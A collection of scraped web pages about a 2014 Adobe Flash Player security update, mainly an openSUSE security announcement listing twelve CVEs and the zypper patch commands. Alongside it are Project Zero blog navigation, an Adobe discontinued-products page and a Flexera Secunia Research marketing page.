  [2022](https://googleprojectzero.blogspot.com/2022/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2022/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2022/11/)
    (3)
  + ►
    [October](https://googleprojectzero.blogspot.com/2022/10/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2022/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2022/06/)
    (3)
  + ►
    [May](https://googleprojectzero.blogspot.com/2022/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2022/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2022/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2022/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2022/01/)
    (1)

* ►
  [2021](https://googleprojectzero.blogspot.com/2021/)
  (24)
  + ►
    [December](https://googleprojectzero.blogspot.com/2021/12/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2021/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2021/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2021/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2021/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2021/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2021/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2021/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2021/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2021/01/)
    (10)

* ►
  [2020](https://googleprojectzero.blogspot.com/2020/)
  (36)
  + ►
    [December](https://googleprojectzero.blogspot.com/2020/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2020/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2020/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2020/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2020/08/)
    (5)
  + ►
    [July](https://googleprojectzero.blogspot.com/2020/07/)
    (8)
  + ►
    [June](https://googleprojectzero.blogspot.com/2020/06/)
    (2)
  + ►
    [April](https://googleprojectzero.blogspot.com/2020/04/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2020/02/)
    (4)
  + ►
    [January](https://googleprojectzero.blogspot.com/2020/01/)
    (5)

* ►
  [2019](https://googleprojectzero.blogspot.com/2019/)
  (27)
  + ►
    [December](https://googleprojectzero.blogspot.com/2019/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2019/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2019/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2019/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2019/08/)
    (11)
  + ►
    [May](https://googleprojectzero.blogspot.com/2019/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2019/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2019/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2019/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2019/01/)
    (2)

* ►
  [2018](https://googleprojectzero.blogspot.com/2018/)
  (22)
  + ►
    [December](https://googleprojectzero.blogspot.com/2018/12/)
    (7)
  + ►
    [November](https://googleprojectzero.blogspot.com/2018/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2018/10/)
    (4)
  + ►
    [September](https://googleprojectzero.blogspot.com/2018/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2018/08/)
    (3)
  + ►
    [July](https://googleprojectzero.blogspot.com/2018/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2018/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2018/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2018/04/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2018/01/)
    (1)

* ►
  [2017](https://googleprojectzero.blogspot.com/2017/)
  (19)
  + ►
    [December](https://googleprojectzero.blogspot.com/2017/12/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2017/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2017/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2017/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2017/07/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2017/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2017/04/)
    (6)
  + ►
    [March](https://googleprojectzero.blogspot.com/2017/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2017/02/)
    (2)

* ►
  [2016](https://googleprojectzero.blogspot.com/2016/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2016/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2016/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2016/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2016/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2016/08/)
    (1)
  + ►
    [July](https://googleprojectzero.blogspot.com/2016/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2016/06/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2016/03/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2016/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2016/01/)
    (1)

* ►
  [2015](https://googleprojectzero.blogspot.com/2015/)
  (33)
  + ►
    [December](https://googleprojectzero.blogspot.com/2015/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2015/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2015/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2015/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2015/08/)
    (6)
  + ►
    [July](https://googleprojectzero.blogspot.com/2015/07/)
    (5)
  + ►
    [June](https://googleprojectzero.blogspot.com/2015/06/)
    (4)
  + ►
    [May](https://googleprojectzero.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2015/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2015/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2015/02/)
    (3)
  + ►
    [January](https://googleprojectzero.blogspot.com/2015/01/)
    (2)

* ▼
  [2014](https://googleprojectzero.blogspot.com/2014/)
  (11)
  + ►
    [December](https://googleprojectzero.blogspot.com/2014/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2014/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2014/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2014/09/)
    (1)
  + ▼
    [August](https://googleprojectzero.blogspot.com/2014/08/)
    (2)
    - [The poisoned NUL byte, 2014 edition](https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html)
    - [What does a pointer look like, anyway?](https://googleprojectzero.blogspot.com/2014/08/what-does-pointer-look-like-anyway.html)
  + ►
    [July](https://googleprojectzero.blogspot.com/2014/07/)
    (3)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).



=== Content from helpx.adobe.com_38365c04_20250125_123237.html ===


# Free and discontinued products | Support options

Search

Last updated on
Dec 13, 2024

Learn which Adobe products have been discontinued, and what support resources are available.

Adobe occasionally discontinues the sale, development, or support of a product or technology due to changing market conditions and their impact on customers. Phone and chat support isn't available for free or discontinued software or services. Read more about the support and resources available to learn about discontinued products.

## Which Adobe products are no longer available or supported?

## Find your product

## Most common products

* [LeanPrint](#leanprint)
* [Muse](#Muse)
* [Flash Player](#flash-player)
* [Lightroom 6](#lightroom-6)
* [Font Folio](#font-folio)

---

## Don't see your product listed?

* **Subscription apps**: Adobe provides installers for only our current apps and the previous major version of each. For more information, see [Adobe software support guidelines](/support/programs/support-periods.html).
* **Non-subscription apps**: If your account is still active and you have purchased your app directly from Adobe or registered it, you may be able to [download from your account](/download-install/kb/downloaded-older-app.html).
* **Support resources**: They may not be available for products that are out of their support periods. See [Products and technical support periods](/support/programs/eol-matrix.html).

## Have more questions about discontinued Adobe products?

![Ask the Community](https://helpx-prod.scene7.com/is/image/HelpxProd/community-32?$png$&jpegSize=100&wid=83)

![Ask the Community](https://helpx-prod.scene7.com/is/image/HelpxProd/community-32?$png$&jpegSize=100&wid=83)

Join the [Adobe community](https://community.adobe.com/) to receive answers to your questions from our expert community members.

## More like this

* [Adobe product availability and support matrix](/support/programs/eol-matrix.html)
* [Adobe apps available for download](/download-install/kb/download-availability.html)
* [Adobe software support guidelines](/support/programs/cc-support-policy.html)

![](/content/dam/helpx/icons/adobe-logo.svg)

## **Get help faster and easier**

Sign in

New user?

Create an account ›

![Avatar]()

Manage account

Quick links

View all your plans
Manage your plans

View quick links

Hide quick links

[Legal Notices](/legal/legal-notices.html)    |    [Online Privacy Policy](https://www.adobe.com/privacy.html)

Share this page

* Copied

### Ask the Community

Post questions and get answers from experts.

[Ask now](https://community.adobe.com/)

### Contact Us

Real help from real people.

[Start now](/contact.html)

^ Back to top

Language Navigation

Language Navigation

Choose a region

Selecting a region changes the language and/or content on Adobe.com.

* Americas
* Brasil
* Canada - English
* Canada - Français
* Latinoamérica
* México
* Argentina
* Colombia
* Perú
* Chile
* United States
* Asia Pacific
* Australia
* Hong Kong S.A.R. of China
* India - English
* Indonesia - English
* Malaysia - English
* New Zealand
* Philippines - English
* Vietnam - English
* 中国
* 中國香港特別行政區
* 台灣地區
* 日本
* Indonesia
* Malaysia
* Pilipinas
* Việt Nam
* भारत
* 한국
* Singapore
* Thailand - English
* ประเทศไทย
* Europe, Middle East and Africa
* Africa - English
* België - Nederlands
* Belgique - Français
* Belgium - English
* Česká republika
* Danmark
* Deutschland
* Eesti
* España
* France
* Greece - English
* Ireland
* Israel - English
* Italia
* Latvija
* Lietuva
* Luxembourg - Deutsch
* Luxembourg - English
* Luxembourg - Français
* Magyarország
* Middle East and North Africa - English
* Nederland
* Norge
* Österreich
* Polska
* Portugal
* România
* Schweiz
* Slovenija
* Slovensko
* Suisse
* Suomi
* Svizzera
* Türkiye
* United Kingdom
* България
* Россия
* Україна
* الشرق الأوسط وشمال أفريقيا - اللغة العربية
* ישראל - עברית
* Sverige
* Saudi Arabia - English
* United Arab Emirates - English
* الإمارات العربية المتحدة
* المملكة العربية السعودية



=== Content from lists.opensuse.org_35323e2a_20250125_123240.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/YJQITKOITMM57Z4YHX57SYYSWVYDMT53/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/YJQITKOITMM57Z4YHX57SYYSWVYDMT53/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/YJQITKOITMM57Z4YHX57SYYSWVYDMT53/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/YJQITKOITMM57Z4YHX57SYYSWVYDMT53/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/YJQITKOITMM57Z4YHX57SYYSWVYDMT53/#YJQITKOITMM57Z4YHX57SYYSWVYDMT53)

# [security-announce] openSUSE-SU-2014:1110-1: important: flash-player to 11.2.202.40

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

10 Sep
2014

10 Sep
'14

15:04

openSUSE Security Update: flash-player to 11.2.202.40
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2014:1110-1
Rating: important
References: #895856
Cross-References: CVE-2014-0547 CVE-2014-0548 CVE-2014-0549
CVE-2014-0550 CVE-2014-0551 CVE-2014-0552
CVE-2014-0553 CVE-2014-0554 CVE-2014-0555
CVE-2014-0556 CVE-2014-0557 CVE-2014-0559
Affected Products:
openSUSE 13.1:NonFree
openSUSE 12.3:NonFree
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes 12 vulnerabilities is now available.
Description:
Adobe Flash Player was updated to 11.2.202.406 (bnc#895856):
\* APSB14-21, CVE-2014-0547, CVE-2014-0548, CVE-2014-0549, CVE-2014-0550,
CVE-2014-0551, CVE-2014-0552, CVE-2014-0553, CVE-2014-0554,
CVE-2014-0555, CVE-2014-0556, CVE-2014-0557, CVE-2014-0559
More information can be found on:
<http://helpx.adobe.com/security/products/flash-player/apsb14-21.html>
Patch Instructions:
To install this openSUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- openSUSE 13.1:NonFree:
zypper in -t patch openSUSE-2014-535
- openSUSE 12.3:NonFree:
zypper in -t patch openSUSE-2014-535
To bring your system up-to-date, use "zypper patch".
Package List:
- openSUSE 13.1:NonFree (i586 x86\_64):
flash-player-11.2.202.406-66.1
flash-player-gnome-11.2.202.406-66.1
flash-player-kde4-11.2.202.406-66.1
- openSUSE 12.3:NonFree (i586 x86\_64):
flash-player-11.2.202.406-2.92.1
flash-player-gnome-11.2.202.406-2.92.1
flash-player-kde4-11.2.202.406-2.92.1
References:
<http://support.novell.com/security/cve/CVE-2014-0547.html>
<http://support.novell.com/security/cve/CVE-2014-0548.html>
<http://support.novell.com/security/cve/CVE-2014-0549.html>
<http://support.novell.com/security/cve/CVE-2014-0550.html>
<http://support.novell.com/security/cve/CVE-2014-0551.html>
<http://support.novell.com/security/cve/CVE-2014-0552.html>
<http://support.novell.com/security/cve/CVE-2014-0553.html>
<http://support.novell.com/security/cve/CVE-2014-0554.html>
<http://support.novell.com/security/cve/CVE-2014-0555.html>
<http://support.novell.com/security/cve/CVE-2014-0556.html>
<http://support.novell.com/security/cve/CVE-2014-0557.html>
<http://support.novell.com/security/cve/CVE-2014-0559.html>
<https://bugzilla.novell.com/895856>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/YJQITKOITMM57Z4YHX57SYYSWVYDMT53/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/YJQITKOITMM57Z4YHX57SYYSWVYDMT53/#YJQITKOITMM57Z4YHX57SYYSWVYDMT53)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from bugzilla.novell.com_f420ce13_20250126_083135.html ===




=== Content from secunia.com_742b3a07_20250125_123246.html ===


[Skip to main content](#main-content)
[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

Search

## Main navigation

* Solutions
  + Column 1
    - Business challenge
      * [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
      * [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
      * [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
      * [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
      * [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
      * [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
      * [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
      * [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
      * [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
      * [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
      * [Public sector](https://www.flexera.com/solutions/public-sector)
  + Column 2
    - Spend management by vendor
      * [IBM](https://www.flexera.com/solutions/vendor/ibm)
      * [Oracle](https://www.flexera.com/solutions/vendor/oracle)
      * [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
      * [SAP](https://www.flexera.com/solutions/vendor/sap)
      * [VMware](https://www.flexera.com/solutions/vendor/vmware)
      * [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
      * [AWS](https://www.flexera.com/solutions/vendor/aws)
      * [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
      * [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
      * [Adobe](https://www.flexera.com/solutions/vendor/adobe)

  ### Achieve more through a united FinOps and ITAM function

  The future is hybrid. Break down the walls between ITAM and FinOps to drive more revenue, more customer growth and more innovation.

  [Discover More](https://www.flexera.com/resources/hybrid-itam-finops)
* Products
  + Column 1
    - [Flexera One](https://www.flexera.com/products/flexera-one)
      * [IT Visibility](https://www.flexera.com/products/flexera-one/it-visibility)
      * [ITAM](https://www.flexera.com/products/flexera-one/it-asset-management)
      * [SaaS Management](https://www.flexera.com/products/flexera-one/saas-management)
      * [FinOps](https://www.flexera.com/products/flexera-one/finops)
      * [Technology Intelligence Platform](https://www.flexera.com/products/flexera-one/technology-intelligence-platform)
  + Column 2
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
      * [Snow Spend Optimizer](https://www.flexera.com/products/snow-atlas/snow-spend-optimizer)
      * [Snow SaaS Management](https://www.flexera.com/products/snow-atlas/snow-saas-management)
  + Column 3
    - Hide group
      * [Security](https://www.flexera.com/products/security)
      * [Application Readiness](https://www.flexera.com/products/adminstudio)
      * [All products](https://www.flexera.com/products)
      * [All Snow products](https://www.flexera.com/products/snow)
      * [Integrations](https://www.flexera.com/products/integrations)

  ### Flexera 2024 State of the Cloud Report

  What do transformative initiatives such as GenAI, machine learning and sustainability mean for the cloud? Check out the 2024 State of the Cloud Report to find the answer as well as all the latest cloud computing trends.

  [View Report](https://info.flexera.com/CM-REPORT-State-of-the-Cloud)
* Success
  + Column 1
    - [Customer success](https://www.flexera.com/customer-success)
      * Support
        + [Flexera support portal](https://community.flexera.com/s/support-hub)
        + [Flexera product documentation](https://docs.flexera.com)
        + [Snow product documentation](https://docs.snowsoftware.io/)
      * Services and training
        + [Services](https://www.flexera.com/customer-success/services)
        + [Training](https://www.flexera.com/customer-success/training)
  + Column 2
    - Hide group
      * [Technology Intelligence Awards](https://www.flexera.com/customer-success/awards)
      * [Flexera community](https://community.flexera.com/s/)

  ### Insights from Gartner®

  Find a curated series of actionable and objective insights for IT executives and their teams. Get expert insights from valued analysts, courtesy of Flexera.

  [Discover More](https://www.flexera.com/resources/gartner-analyst-research)
* Resources
  + Column 1
    - [Resources](https://www.flexera.com/resources)
      * [Webinars](https://www.flexera.com/resources?type%5Bwebinar%5D=webinar)
      * [Videos](https://www.flexera.com/resources?type%5Bvideo%5D=video)
      * [Datasheets](https://www.flexera.com/resources?type%5Bdatasheet%5D=datasheet)
      * [White papers & reports](https://www.flexera.com/resources?type%5Bwhite-paper-industry-report%5D=white-paper-industry-report)
  + Column 2
    - Hide group
      * [Blog](/blog/)
      * [Case studies](https://www.flexera.com/resources/case-studies)
      * [Events](https://www.flexera.com/resources?type%5Bevent%5D=event)
      * [Analyst Research](https://www.flexera.com/resources/gartner-analyst-research)
      * [Glossary](https://www.flexera.com/resources/glossary)
      * [Demos & trials](https://www.flexera.com/resources?type%5Bdemo-trials%5D=demo-trials)
      * [Business value calculator](https://www.flexera.com/resources/business-value-calculator)

  ### Flexera 2025 IT Priorities Report

  Insights from Flexera’s 2025 IT Priorities Report highlight what’s top of mind for IT decision makers in the year ahead. Discover the challenges, priorities and opportunities that will shape the future IT landscape.

  [View Report](https://info.flexera.com/ITV-REPORT-IT-Priorities)
* About
  + Column 1
    - [Company](https://www.flexera.com/about-us)
      * [About](https://www.flexera.com/about-us)
      * [Careers](https://www.flexera.com/about-us/careers)
      * [Contact](https://www.flexera.com/about-us/contact-us)
      * [Leadership](https://www.flexera.com/about-us/leadership)
    - [Partners](https://www.flexera.com/about-us/partners)
      * [Partner program](https://www.flexera.com/about-us/partners/partner-program)
      * [Partner directory](https://www.flexera.com/about-us/partners/directory)
  + Column 2
    - [Press center](https://www.flexera.com/about-us/press-center)
      * [Press releases](https://www.flexera.com/about-us/all-press-releases)
      * [Awards](https://www.flexera.com/about-us/press-center#awards)
      * [Articles](https://www.flexera.com/about-us/all-articles)
    - Hide group
      * Social responsibility
        + [ESG](https://www.flexera.com/about-us/environmental-social-governance)
        + [Diversity](https://www.flexera.com/about-us/diversity)

  ### More value with technology intelligence

  The unparalleled synergy of Flexera and Snow provides the Technology Intelligence you need for more efficiency, insight and governance than ever before.

  [Discover More](https://www.flexera.com/more-value-with-technology-intelligence)

Search

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

## External Links

* External Links
  + [Community](https://community.flexera.com/)
  + [Product Access](https://app.flexera.com/login)
  + [Partner Portal](https://flexera.channeltivity.com/Login)

[Book a demo](/about-us/contact-us?C_Interest1=sales)

# Secunia Research

## The world’s best vulnerability intelligence

The Secunia Research team from Flexera provides the most accurate and reliable source of vulnerability intelligence.

[Contact Us](https://www.flexera.com/about-us/contact-us?C_Interest1=sales&C_SolutionInterest=SVM)
Watch video (0:29)

Related links

* [Anatomy of a security advisory](https://www.flexera.com/resources/infographics/anatomy-of-a-security-advisory)
* [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)
* [Software Vulnerability Manager](/products/software-vulnerability-manager)
* [Security advisories from Secunia Research](https://www.flexera.com/products/security/software-vulnerability-advisories)
* [Report a vulnerability](https://www.flexera.com/about-us/contact-us/report-vulnerability)

 ![Secunia Research](/sites/default/files/2022-04/hero-secunia-research-bg.jpg)

Featured Details

## Multiple ways to consume Secunia Research

Secunia delivers software security research that provides reliable, curated and actionable vulnerability intelligence. Organizations can expect to receive standardized, validated and enriched vulnerability research on a specific version of a software product. Secunia Research supports four solutions:

![Software Vulnerability Research](/sites/default/files/2022-04/icon-secunia-research-svr.svg)

### [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)

Software Vulnerability Research utilizes Secunia Research to drive awareness of vulnerabilities matching your specified criteria

[Learn More](https://www.flexera.com/products/software-vulnerability-research)

![Software Vulnerability Manager](/sites/default/files/2022-04/icon-secunia-research-svm.svg)

### [Software Vulnerability Manager](/products/software-vulnerability-manager)

Software Vulnerability Manager uses Secunia Research data to identify, prioritize and patch known vulnerable software detected in your environment

[Learn More](/products/software-vulnerability-manager)

![Data Platform](/sites/default/files/2022-04/icon-secunia-research-dp.svg)

### [Data Platform](https://www.flexera.com/products/data-platform)

Data Platform leverages Secunia Research to provide high-level insights based on major or minor versions of software in your normalized inventory

[Learn More](https://www.flexera.com/products/data-platform)

![Flexera One](/sites/default/files/2022-04/icon-secunia-research-flexera-one.svg)

### [Flexera One](/flexera-one)

Flexera One utilizes Secunia Research (alongside public NVD data) to provide more granular matching of build-level versions of software in your normalized inventory within its IT Asset Management and IT Visibility solutions

[Learn More](/flexera-one)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Informing IT, Transforming IT

## Industry insights to help keep you informed

[#### Webinar

### Stay Ahead of Cyber Threats: Flexera's Latest Vulnerability Insights

Join us for this session where we'll explore the latest findings from the Flexera Monthly Vulnerability Insights Report.](https://info.flexera.com/SVM-WBNR-Vulnerability-Insights-Roundtable)

[#### Webinar

### Dive deeper into the Flexera Annual Vulnerability Insights

We'll explore the key findings from the Flexera Annual Vulnerability Insights Report. Learn about the latest cybersecurity trends, the most targeted industries, the types of vulnerabilities, plus management and mitigation strategies.](https://info.flexera.com/SVM-WBNR-Flexera-Annual-Vulnerability-Insights?lead_source=Website%20Visitor&id=Flexera.com-Resources)

#### Video

### Close the Risk Window with Software Vulnerability Manager

Stop reacting. Gain control. Stay secure. Build a more effective risk mitigation process leveraging Secunia Research vulnerability intelligence and the largest repository of third-party patch data in the industry.

Remote video URL

[#### Trial

### Software Vulnerability Manager Assessment free trial

Get access to the complete set of modules of Software Vulnerability Manager: Research, Assessment and Patching](https://info.flexera.com/SVM-EVAL-Software-Vulnerability-Manager)

[#### Datasheet

### Protect your ServiceNow® investment with the highest quality data

IT Visibility offers certified ServiceNow integrations that accelerate platform expansion, improve ROI and increase efficiencies across ITIL processes by delivering clean software and hardware asset data directly.](/sites/default/files/datasheet-itv-maximize-servicenow-investment.pdf)

[#### Blog

### Avoid missing crucial vulnerability intelligence amid NVD backlog

Recent developments regarding the National Vulnerability Database (NVD) have some technology leaders on edge. Since February, the U.S. National Institute of Standards and Technology (NIST) has almost completely stopped enriching software vulnerabi...](https://www.flexera.com/blog/vulnerability-management/avoid-missing-crucial-vulnerability-intelligence-amid-nvd-backlog/)

[View all resources](https://www.flexera.com/resources?category%5Bsoftware-vulnerability-management%5D=software-vulnerability-management)

## Footer Menu

* Column
  + Business challenge
    - [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
    - [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
    - [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
    - [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
    - [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
    - [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
    - [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
    - [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
    - [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
    - [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
    - [Public sector](https://www.flexera.com/solutions/public-sector)
* Column
  + Spend management by vendor
    - [IBM](https://www.flexera.com/solutions/vendor/ibm)
    - [Oracle](https://www.flexera.com/solutions/vendor/oracle)
    - [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
    - [SAP](https://www.flexera.com/solutions/vendor/sap)
    - [VMware](https://www.flexera.com/solutions/vendor/vmware)
    - [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
    - [AWS](https://www.flexera.com/solutions/vendor/aws)
    - [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
    - [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
    - [Adobe](https://www.flexera.com/solutions/vendor/adobe)
* Column
  + Products
    - [Flexera One](https://www.flexera.com/products/flexera-one)
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
    - [Security](https://www.flexera.com/products/security)
    - [Application Readiness](https://www.flexera.com/products/adminstudio)
    - [All products](https://www.flexera.com/products)
    - [All Snow products](https://www.flexera.com/products/snow)
    - [Integrations](https://www.flexera.com/products/integrations)
* Column
  + Company
    - [About](https://www.flexera.com/about-us)
    - [Careers](https://www.flexera.com/about-us/careers)
    - [Leadership](https://www.flexera.com/about-us/leadership)
    - [Contact us](https://www.flexera.com/about-us/contact-us)
    - [Media / press center](https://www.flexera.com/about-us/press-center)
    - [Revenera.com](https://www.revenera.com)

 +1.800.374.4353

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

 [![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

